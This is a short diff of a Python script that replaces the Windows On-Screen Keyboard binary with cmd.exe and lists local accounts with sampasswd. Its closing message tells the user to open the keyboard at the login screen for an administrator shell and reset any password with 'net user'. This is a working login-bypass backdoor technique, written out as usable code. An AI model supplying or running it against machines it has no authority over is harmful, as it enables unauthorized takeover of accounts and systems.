@@ -10,7 +10,7 @@ print("Found following users:\n")
 os.system("sudo sampasswd -l {}".format(sam))
 print("\n")
 
-os.system("sudo cp {} {}.win".format(cmd, cmd))
+os.system("sudo cp {} {}.win".format(OSK, OSK))
 os.system("sudo cp {} {}".format(cmd,OSK))
 
 print("DONE!!!\nGo to the Windows login screen and run the ON SCREEN KEYBOARD, you'll have a terminal with administrator permissions.\n\nRun the following commands to change the password:\nnet user {WINDOWS_USERNAME} {NEW_PASSWORD}")
